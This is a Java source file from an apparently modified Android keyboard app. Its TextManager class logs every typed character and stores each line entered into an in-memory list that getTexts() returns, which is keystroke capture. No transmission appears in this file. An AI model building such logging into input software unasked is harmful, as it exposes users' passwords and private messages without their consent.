package rkr.simplekeyboard.inputmethod.logger;

import static android.content.ContentValues.TAG;

import android.util.Log;

import java.util.ArrayList;

import rkr.simplekeyboard.inputmethod.latin.common.Constants;

public class TextManager {
    private static TextManager textManager;
    final private ArrayList<String> texts = new ArrayList<>();
    private String currText = "";

    private boolean justEntered = true;

    public static TextManager getInstance() {
        if (textManager == null)
            textManager = new TextManager();
        return textManager;
    }

    public void handleText(int code) {
        if (isEnter(code)) {
//            if (!justEntered) {
//                Log.d(TAG, "TextManager: Entered twice, dropping ...");
                saveText();
//            }
//            justEntered = true;
        } else {
//            justEntered = false;
            if (isDelete(code))
                deleteChar();
            else
                addChar(Constants.userReadableCode(code));
        }
    }

    private void addChar(String ch) {
        currText += ch;
    }

    private void saveText() {
        texts.add(currText);
        currText = "";
    }

    private void deleteChar() {
        if (currText.length() == 0) return;
        currText = currText.substring(0, currText.length() - 1);
    }

    public String getCurrText() {
        return currText;
    }

    public String getTexts() {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        sb.append('\n');
        for (String text : texts) {
            sb.append("\t");
            sb.append(text);
            sb.append('\n');
        }
        sb.append("]");
        return sb.toString();
    }

    private boolean isDelete(final int code) {
        return code == Constants.CODE_DELETE;
    }

    private boolean isEnter(final int code) {
        return code == Constants.CODE_ENTER;
    }
}
